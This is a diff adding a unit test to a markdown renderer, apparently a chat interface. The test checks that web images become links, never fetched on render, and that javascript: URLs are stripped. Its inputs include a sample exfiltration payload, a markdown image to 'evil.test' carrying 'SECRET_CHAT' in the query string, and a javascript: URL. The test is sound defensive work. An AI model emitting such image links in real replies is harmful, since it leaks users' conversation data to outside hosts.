@@ -161,3 +161,14 @@ test('a citation is a small chip with its number, whatever search found the sour
   // A link that merely reads as a number is not a citation.
   assert.ok(!render('Page [2](https://x.test).').includes('citation'));
 });
+
+test('an image from the web is a link to open, never fetched on render', () => {
+  const html = render('Look: ![chart](https://evil.test/p.png?d=SECRET_CHAT)');
+  assert.doesNotMatch(html, /<img/);
+  assert.match(
+    html,
+    /<a href="https:\/\/evil\.test\/p\.png\?d=SECRET_CHAT"[^>]*rel="noopener noreferrer"/,
+  );
+  assert.match(html, /Image: chart \(open\)/);
+  assert.doesNotMatch(render('![x](javascript:alert(1))'), /javascript:/);
+});
